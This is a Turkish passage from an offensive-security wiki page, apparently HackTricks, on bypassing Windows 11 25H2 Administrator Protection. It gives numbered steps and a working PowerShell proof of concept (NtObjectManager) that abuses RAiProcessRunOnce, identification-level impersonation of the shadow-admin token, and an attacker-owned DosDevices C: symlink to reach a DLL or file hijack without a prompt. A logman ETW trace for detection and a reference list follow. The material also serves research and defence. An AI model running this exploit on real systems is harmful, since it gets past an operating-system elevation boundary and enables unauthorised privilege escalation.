> Ağustos 2026 itibarıyla Microsoft, Administrator Protection'ı hâlâ **Insider preview** olarak belgeliyor: Ekim 2025 rollout'u geri alındı ve daha sonraki bir tarih için planlandı. Bu chain'leri test etmeden önce **Admin Approval Mode with Administrator protection** özelliğinin gerçekten etkin olduğunu ve cihazın yeniden başlatıldığını doğrulayın; tek başına stock 25H2 version string bu özelliğin aktif olduğunu kanıtlamaz.<sup>[[10]](#references)</sup>

Windows 11 25H2 preview build'lerinde `RAiLaunchAdminProcess` / UIAccess attack surface'in tamamı için özel sayfayı inceleyin:

{{#ref}}
../windows-local-privilege-escalation/uiaccess-admin-protection-bypass.md
{{#endref}}

Windows 11 25H2 “Administrator Protection”, per-session `\Sessions\0\DosDevices/<LUID>` map'lerine sahip shadow-admin token'ları kullanır. Directory, ilk `\??` resolution işleminde `SeGetTokenDeviceMap` tarafından lazy olarak oluşturulur. Saldırgan shadow-admin token'ını yalnızca **SecurityIdentification** seviyesinde impersonate ederse directory, saldırgan **owner** olacak şekilde oluşturulur (`CREATOR OWNER`'ı inherit eder); bu da `\GLOBAL??` karşısında öncelik kazanan drive-letter link'lerine olanak tanır.<sup>[[7]](#references)</sup>

**Adımlar:**

1. Düşük yetkili bir session'dan, prompt içermeyen bir shadow-admin `runonce.exe` başlatmak için `RAiProcessRunOnce` çağırın.
2. Primary token'ını bir **identification** token'ına duplicate edin ve `\Sessions\0\DosDevices/<LUID>` konumunun attacker ownership altında oluşturulmasını zorlamak için `\??` açılırken bu token'ı impersonate edin.
3. Burada attacker-controlled storage konumunu gösteren bir `C:` symlink'i oluşturun; bundan sonraki filesystem access işlemleri bu session içinde `C:` konumunu attacker path'ine resolve eder ve prompt olmadan DLL/file hijack yapılmasını sağlar.

**PowerShell PoC (NtObjectManager):**
```powershell
$pid = Invoke-RAiProcessRunOnce
$p = Get-Process -Id $pid
$t = Get-NtToken -Process $p
$id = New-NtTokenDuplicate -Token $t -ImpersonationLevel Identification
Invoke-NtToken $id -ImpersonationLevel Identification { Get-NtDirectory "\??" | Out-Null }
$auth = Get-NtTokenId -Authentication -Token $id
New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\loot"
```
Önizleme ana bilgisayarlarında Administrator Protection, `Microsoft-Windows-LUA` sağlayıcısı altında **15031** ve **15032** ETW olayları olarak onayları ve başarısızlıkları kaydeder. Olaylar; istekte bulunan SID'sini, uygulama yolunu, sonucu, yönetilen yönetici hesabını ve kimlik doğrulama yöntemini içerir. Bu nedenle tekrarlanan exploit girişimleri veya başarısız UI yönlendirme işlemleri telemetri dışında kalmaz.<sup>[[10]](#references)</sup>
```cmd
logman start AdminProtectionTrace -p {93c05d69-51a3-485e-877f-1806a8731346} -ets
rem reproduce the elevation attempt
logman stop AdminProtectionTrace -ets
```
## References

- [1] [LOLBAS: Iscsicpl.exe](https://lolbas-project.github.io/lolbas/Binaries/Iscsicpl/)
- [2] [Microsoft Docs – Kullanıcı Hesabı Denetimi nasıl çalışır](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [3] [UACME – UAC bypass teknikleri koleksiyonu](https://github.com/hfiref0x/UACME)
- [4] [WinPwnage – UAC bypass uyumluluk tarayıcısı ve başlatıcısı](https://github.com/rootm0s/WinPwnage)
- [5] [Checkpoint Research – KONNI, PowerShell Backdoor'ları oluşturmak için AI'ı benimsiyor](https://research.checkpoint.com/2026/konni-targets-developers-with-ai-malware/)
- [6] [Check Point Research – Operation TrueChaos: Güneydoğu Asya hükümet hedeflerine karşı 0-Day exploitation](https://research.checkpoint.com/2026/operation-truechaos-0-day-exploitation-against-southeast-asian-government-targets/)
- [7] [Project Zero – Windows Administrator Protection'ı bypass etme](https://projectzero.google/2026/26/windows-administrator-protection.html)
- [8] [Sigma / Detection.FYI – SilentCleanup Görevi Kullanılarak UAC Bypass](https://detection.fyi/sigmahq/sigma/windows/registry/registry_set/registry_set_bypass_uac_using_silentcleanup_task/)
- [9] [R41N3RZUF477 – UnifiedConsent, TabTip ve Narrator Always Notify bypass'ları](https://github.com/hfiref0x/UACME/issues/173)
- [10] [Microsoft Learn – Yönetici koruması](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/administrator-protection/)
{{#include ../../banners/hacktricks-training.md}}
